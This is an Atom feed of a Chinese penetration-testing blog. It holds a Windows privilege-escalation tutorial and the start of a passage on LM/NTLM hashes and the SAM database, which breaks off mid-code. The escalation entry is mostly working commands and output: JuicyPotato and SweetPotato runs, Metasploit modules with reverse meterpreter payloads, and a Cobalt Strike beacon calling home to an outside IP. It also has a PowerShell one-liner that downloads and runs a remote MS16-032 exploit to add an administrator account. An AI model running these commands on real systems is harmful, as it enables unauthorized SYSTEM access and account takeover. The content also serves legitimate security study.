<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>steady&#39;s blog</title>
  
  <subtitle>深山夕照深秋雨。</subtitle>
  <link href="http://s1eady.top/atom.xml" rel="self"/>
  
  <link href="http://s1eady.top/"/>
  <updated>2020-12-10T15:12:48.815Z</updated>
  <id>http://s1eady.top/</id>
  
  <author>
    <name>steady</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试--windows系统信息收集与提权-(3)</title>
    <link href="http://s1eady.top/2020/12/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(3)/"/>
    <id>http://s1eady.top/2020/12/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(3)/</id>
    <published>2020-12-20T03:51:30.000Z</published>
    <updated>2020-12-10T15:12:48.815Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h2><h3 id="脏土豆提权MS16-075"><a href="#脏土豆提权MS16-075" class="headerlink" title="脏土豆提权MS16-075"></a>脏土豆提权MS16-075</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>烂土豆提权就是俗称的MS16-075。</p><p>可以将Windows工作站上的特权从最低级别提升到”NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><h5 id="权限是否开启"><a href="#权限是否开启" class="headerlink" title="权限是否开启"></a>权限是否开启</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; whoami /priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">特殊权限名称                  描述                   状况  </span><br><span class="line">============================= ====================== ======</span><br><span class="line">SeAuditPrivilege              产生安全稽核           已停用</span><br><span class="line">SeIncreaseQuotaPrivilege      调整处理程序记忆体配额 已停用</span><br><span class="line">SeAssignPrimaryTokenPrivilege 更换处理层权杖         已停用</span><br><span class="line">SeChangeNotifyPrivilege       略过周游检查           已启用</span><br><span class="line">SeImpersonatePrivilege        验证后模拟用户端       已启用</span><br><span class="line">SeCreateGlobalPrivilege       建立全域物件           已启用</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure><h5 id="RPC默认端口"><a href="#RPC默认端口" class="headerlink" title="RPC默认端口"></a>RPC默认端口</h5><h6 id="查看端口是否开启"><a href="#查看端口是否开启" class="headerlink" title="查看端口是否开启"></a>查看端口是否开启</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; netstat -ano | findstr &quot;135&quot;</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       760</span><br><span class="line">  TCP    127.0.0.1:3148         127.0.0.1:135          TIME_WAIT       0</span><br><span class="line">  TCP    127.0.0.1:3151         127.0.0.1:135          TIME_WAIT       0</span><br><span class="line">  TCP    127.0.0.1:3154         127.0.0.1:135          TIME_WAIT       0</span><br><span class="line">  TCP    127.0.0.1:3157         127.0.0.1:135          TIME_WAIT       0</span><br></pre></td></tr></table></figure><h6 id="查看端口对应的服务"><a href="#查看端口对应的服务" class="headerlink" title="查看端口对应的服务"></a>查看端口对应的服务</h6><p>如果被修改(例如为1234)，juicypotato的参数可以使用<code>-n 1234</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; tasklist | findstr 760</span><br><span class="line">svchost.exe                    760 Console                    0      4,360 K</span><br></pre></td></tr></table></figure><p>svchost.exe是一个RPC服务。</p><h5 id="选择可用的CLSID"><a href="#选择可用的CLSID" class="headerlink" title="选择可用的CLSID"></a>选择可用的CLSID</h5><p>参考列表</p><p><code>https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</code></p><p>根据你的系统类型选择<code>CLSID（EG:&#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;）</code></p><p>然后-c指定即可。</p><h5 id="选择一个系统未占用的端口作为监听端口"><a href="#选择一个系统未占用的端口作为监听端口" class="headerlink" title="选择一个系统未占用的端口作为监听端口"></a>选择一个系统未占用的端口作为监听端口</h5><p>-l参数指定即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;）</span><br></pre></td></tr></table></figure><p>即使用SeImpersonate权限创建进程，监听端口1111，使用的CLSID为{8BC3F05E-D86B-11D0-A075-00C04FB68820}来进行提权。</p><h4 id="msf利用烂土豆提权"><a href="#msf利用烂土豆提权" class="headerlink" title="msf利用烂土豆提权"></a>msf利用烂土豆提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set session 1</span><br><span class="line">set lhost xx.xx.xx.xx</span><br><span class="line">set lport 6666</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>如果目标系用没有权限则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[-] Microsoft Windows before Server 2008 R2 are not vulnerable.</span><br><span class="line">[-] Exploit aborted due to failure: no-access: User does not have SeImpersonate or SeAssignPrimaryToken Privilege</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>对应的目标系统权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; whoami &#x2F;priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">特殊权限名称                  描述                   状况  </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAuditPrivilege              产生安全稽核           已停用</span><br><span class="line">SeIncreaseQuotaPrivilege      调整处理程序记忆体配额 已停用</span><br><span class="line">SeAssignPrimaryTokenPrivilege 更换处理层权杖         已停用</span><br><span class="line">SeChangeNotifyPrivilege       略过周游检查           已启用</span><br><span class="line">SeImpersonatePrivilege        验证后模拟用户端       已启用</span><br><span class="line">SeCreateGlobalPrivilege       建立全域物件           已启用</span><br></pre></td></tr></table></figure><p>可以看到<code>SeAssignPrimaryToken</code>已停用。</p><h4 id="SweetPotato-exe"><a href="#SweetPotato-exe" class="headerlink" title="SweetPotato.exe"></a>SweetPotato.exe</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SweetPotato.exe -a &quot;whoami&quot;</span><br><span class="line">Modify by https:&#x2F;&#x2F;www.xljtj.com</span><br><span class="line">[+] Attempting DCOM NTLM interception with CLID 4991D34B-80A1-4291-83B6-3328366B9097 on port 6666 using method Token to launch c:\Windows\System32\cmd.exe</span><br><span class="line">[+] Intercepted and authenticated successfully, launching program</span><br><span class="line">[+] CreatePipe success</span><br><span class="line">[+] Created launch thread using impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">[+] Command : &quot;c:\Windows\System32\cmd.exe&quot; &#x2F;c whoami </span><br><span class="line">[+] process with pid: 0 created.</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[!] Failed to created impersonated process with token: 1349</span><br></pre></td></tr></table></figure><h4 id="CS插件脏土豆提权"><a href="#CS插件脏土豆提权" class="headerlink" title="CS插件脏土豆提权"></a>CS插件脏土豆提权</h4><p>插件地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;scanfsec&#x2F;AggressorCNA&#x2F;blob&#x2F;master&#x2F;reflectiveJuicyPotato&#x2F;juicypotato.cn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DeEpinGh0st&#x2F;Erebus</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Task Beacon to run windows&#x2F;beacon_http&#x2F;reverse_http (164.155.95.252:7777) via RottenPotato (ms16-075)</span><br><span class="line">[*] Tasked beacon to spawn NTLM DCOM-&gt;RPC NTLM Reflection (MS16-075)</span><br><span class="line">[+] host called home, sent: 256865 bytes</span><br></pre></td></tr></table></figure><h3 id="ms16-032"><a href="#ms16-032" class="headerlink" title="ms16-032"></a>ms16-032</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li><p>漏洞影响从Vista到Windows 10的所有Windows版本（包括服务器版本），比如03、08和12。</p></li><li><p>目标系统需要有2个以上的CPU核心</p></li><li><p>PowerShell v2.0及更高版本必须正在运行</p></li></ul><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(‘https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;&#x2F;c net localgroup administrators test1 &#x2F;add&#39;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 8</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[?] Done, got 2 thread handle(s)!</span><br><span class="line"></span><br><span class="line">[?] Thread handle list:</span><br><span class="line">1604</span><br><span class="line">2424</span><br><span class="line"></span><br><span class="line">[*] Sniffing out privileged impersonation token..</span><br><span class="line"></span><br><span class="line">[?] Trying thread handle: 1604</span><br><span class="line">[?] Thread belongs to: svchost</span><br><span class="line">[+] Thread suspended</span><br><span class="line">[&gt;] Wiping current impersonation token</span><br><span class="line">[&gt;] Building SYSTEM impersonation token</span><br><span class="line">[?] Success, open SYSTEM token handle: 2420</span><br><span class="line">[+] Resuming thread..</span><br><span class="line"></span><br><span class="line">[*] Sniffing out SYSTEM shell..</span><br><span class="line"></span><br><span class="line">[&gt;] Duplicating SYSTEM token</span><br><span class="line">[&gt;] Starting token race</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS C:\Documents and Settings\good&gt; net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line"></span><br><span class="line">成員</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">banli$</span><br><span class="line">good</span><br><span class="line">Guest</span><br><span class="line">gust</span><br><span class="line">IUSR_TELNET</span><br><span class="line">TelNet</span><br><span class="line">命令執行成功。</span><br></pre></td></tr></table></figure><h5 id="ps脚本"><a href="#ps脚本" class="headerlink" title="ps脚本"></a>ps脚本</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1</span></span><br></pre></td></tr></table></figure><p>执行系统命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#x27;);Invoke-MS16-032 -Application cmd.exe -commandline &#x27;/c net user evi1cg test123 /add&#x27;&quot;</span></span><br></pre></td></tr></table></figure><h5 id="exe文件"><a href="#exe文件" class="headerlink" title="exe文件"></a>exe文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032</span></span><br></pre></td></tr></table></figure><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><p>MS16-032 Secondary Logon Handle提权，该模块利用的是Windows Secondary Logon服务中标准句柄清理功能的缺失。已知该漏洞会影响Windows7-10，Windows Server2008和2012，32位和64位都会受影响。这个模块只对集成了powershell2.0或更高版本的Windows且具有多个CPU内核的系统有效。<br>步骤同上，直接在MSF中使用下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows系统提权&quot;&gt;&lt;a href=&quot;#Windows系统提权&quot; class=&quot;headerlink&quot; title=&quot;Windows系统提权&quot;&gt;&lt;/a&gt;Windows系统提权&lt;/h2&gt;&lt;h3 id=&quot;脏土豆提权MS16-075&quot;&gt;&lt;a href=&quot;#脏土豆提</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--Metasploit使用</title>
    <link href="http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/"/>
    <id>http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/</id>
    <published>2020-12-08T00:12:06.000Z</published>
    <updated>2020-12-10T15:12:23.844Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透–横向纵横1"><a href="#内网渗透–横向纵横1" class="headerlink" title="内网渗透–横向纵横1"></a>内网渗透–横向纵横1</h1><p>哈希传递（PTH）票据传递（PTT）委派攻击等，都是基于域环境下的认证机制来实现的。所以我们需要先了解一下windows的认证机制。</p><h2 id="Hash的认识"><a href="#Hash的认识" class="headerlink" title="Hash的认识"></a>Hash的认识</h2><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>LM(LAN Mannager) 协议使用的hash就叫做 LM Hash,比较容易破解。</p><p><strong>自WindowsVista和Windows Server 2008开始,Windows取消LM hash。</strong></p><h4 id="LM-Hash生成过程"><a href="#LM-Hash生成过程" class="headerlink" title="LM Hash生成过程"></a>LM Hash生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户的密码被限制为最多14个字符。</span><br><span class="line">用户的密码转换为大写。</span><br><span class="line">密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span><br><span class="line">密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7bit为一组末尾加0，组成新的编码（str_to_key()函数处理）</span><br><span class="line">上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span><br><span class="line">将二组DES加密后的编码拼接，得到最终LM HASH值。</span><br></pre></td></tr></table></figure><h4 id="LM-Hash的缺点"><a href="#LM-Hash的缺点" class="headerlink" title="LM Hash的缺点"></a>LM Hash的缺点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密码长度最大只能为14个字符</span><br><span class="line">密码不区分大小写(加密过程统一转换为大写,导致的)</span><br><span class="line">加密结果后16位为aad3b435b51404ee,则说明密码强度小于7位。(如果不够7位的话,后面需要用0来补全)</span><br></pre></td></tr></table></figure><h4 id="生成过程"><a href="#生成过程" class="headerlink" title="生成过程"></a>生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">from pyDes import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def DesEncrypt(str, Des_Key):</span><br><span class="line">    k &#x3D; des(Des_Key, ECB, pad&#x3D;None)</span><br><span class="line">    EncryptStr &#x3D; k.encrypt(str)</span><br><span class="line">    return binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Zero_padding(str):</span><br><span class="line">    b &#x3D; []</span><br><span class="line">    l &#x3D; len(str)</span><br><span class="line">    num &#x3D; 0</span><br><span class="line">    for n in range(l):</span><br><span class="line">        if (num &lt; 8) and n % 7 &#x3D;&#x3D; 0:</span><br><span class="line">            b.append(str[n:n + 7] + &#39;0&#39;)</span><br><span class="line">            num &#x3D; num + 1</span><br><span class="line">    return &#39;&#39;.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    test_str &#x3D; &quot;123456&quot;</span><br><span class="line">    # 用户的密码转换为大写,并转换为16进制字符串</span><br><span class="line">    test_str &#x3D; test_str.upper().encode(&#39;hex&#39;)</span><br><span class="line">    str_len &#x3D; len(test_str)</span><br><span class="line"></span><br><span class="line">    # 密码不足14字节将会用0来补全</span><br><span class="line">    if str_len &lt; 28:</span><br><span class="line">        test_str &#x3D; test_str.ljust(28, &#39;0&#39;)</span><br><span class="line"></span><br><span class="line">    # 固定长度的密码被分成两个7byte部分</span><br><span class="line">    t_1 &#x3D; test_str[0:len(test_str) &#x2F; 2]</span><br><span class="line">    t_2 &#x3D; test_str[len(test_str) &#x2F; 2:]</span><br><span class="line"></span><br><span class="line">    # 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span><br><span class="line">    t_1 &#x3D; bin(int(t_1, 16)).lstrip(&#39;0b&#39;).rjust(56, &#39;0&#39;)</span><br><span class="line">    t_2 &#x3D; bin(int(t_2, 16)).lstrip(&#39;0b&#39;).rjust(56, &#39;0&#39;)</span><br><span class="line"></span><br><span class="line">    # 再分7bit为一组末尾加0，组成新的编码</span><br><span class="line">    t_1 &#x3D; Zero_padding(t_1)</span><br><span class="line">    t_2 &#x3D; Zero_padding(t_2)</span><br><span class="line">    print t_1</span><br><span class="line">    t_1 &#x3D; hex(int(t_1, 2))</span><br><span class="line">    t_2 &#x3D; hex(int(t_2, 2))</span><br><span class="line">    t_1 &#x3D; t_1[2:].rstrip(&#39;L&#39;)</span><br><span class="line">    t_2 &#x3D; t_2[2:].rstrip(&#39;L&#39;)</span><br><span class="line"></span><br><span class="line">    if &#39;0&#39; &#x3D;&#x3D; t_2:</span><br><span class="line">        t_2 &#x3D; &quot;0000000000000000&quot;</span><br><span class="line">    t_1 &#x3D; binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 &#x3D; binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    # 上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span><br><span class="line">    LM_1 &#x3D; DesEncrypt(&quot;KGS!@#$%&quot;, t_1)</span><br><span class="line">    LM_2 &#x3D; DesEncrypt(&quot;KGS!@#$%&quot;, t_2)</span><br><span class="line"></span><br><span class="line">    # 将二组DES加密后的编码拼接，得到最终LM HASH值。</span><br><span class="line">    LM &#x3D; LM_1 + LM_2</span><br><span class="line">    print LM</span><br></pre></td></tr></table></figure><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>NT LAN Manager(NTLM) 哈希是windows系统认可的另一种算法,用于替代古老的LM-Hash, 一般指Windows系统下Security Account Manager(SAM)中保存的用户密码的hash。在Windows Vista/Windows 7/Windows Server 2008以及后面的系统中，NTLM哈希算法是默认启用的。</p><h4 id="NTLM-Hash-生成过程"><a href="#NTLM-Hash-生成过程" class="headerlink" title="NTLM Hash 生成过程"></a>NTLM Hash 生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先将用户密码转换为十六进制格式。</span><br><span class="line">将十六进制格式的密码进行Unicode编码。</span><br><span class="line">使用MD4摘要算法对Unicode编码数据进行Hash计算</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &#39;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;admin&quot;.encode(&quot;utf-16le&quot;)).digest())&#39;</span><br></pre></td></tr></table></figure><h2 id="WINDOWS认证机制"><a href="#WINDOWS认证机制" class="headerlink" title="WINDOWS认证机制"></a>WINDOWS认证机制</h2><h3 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h3><p>SAM(Security Account Manager) 安全账户管理器是一个数据库文件，在Windows XP，Windows Vista,windows7-10用于存储用户的密码。他可以用来验证本地和远程用户。在windows 2000 sp4 开始,Active Dircetory 对远程用户进行身份验证。SAM使用加密措施来防止未经身份验证的用户访问系统。</p><p>用户密码以哈希格式存储在 注册表配置单元中(registry hive), 作为LM Hash or NTLM Hash。</p><p>这个文件可以在<code>%SystemRoot%/system32/config/SAM</code> 和 挂载在<code>HKLM/SAM</code>。</p><p>WIndows运行时无法移动或者复制SAM文件，因为Windows 内核获取并在SAM文件上保留了独占的文件系统锁，并且在操作系统关闭之前不会释放该锁。</p><p>为了提高针对破解的SAM数据库的安全性, Microsoft 在Windows NT 4.0 中引入了SYSKEY功能。该功能会使用密钥对存储在SAM中的所有本地账户的密码哈希值进行加密。可以通过<code>syskey</code>程序来启用它。</p><h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><p>生成NTLM Hash：</p><p>操作系统运行winlogon进程显示登陆界面，接收用户的输入，然后将输入密码交予给lsass进程，该进程会执行以下下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用动态密钥对称加密的方式在内存缓存一份&quot;明文密码&quot;</span><br><span class="line">将密码转换成NTLM Hash</span><br></pre></td></tr></table></figure><p>哈希对比：</p><p>将用户输入的密码计算成NTLM Hash，然后与sam数据库<code>（%SystemRoot%\system32\config\sam）</code>中该用户的哈希比对。</p><p>相关数据文件在win的文件夹下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 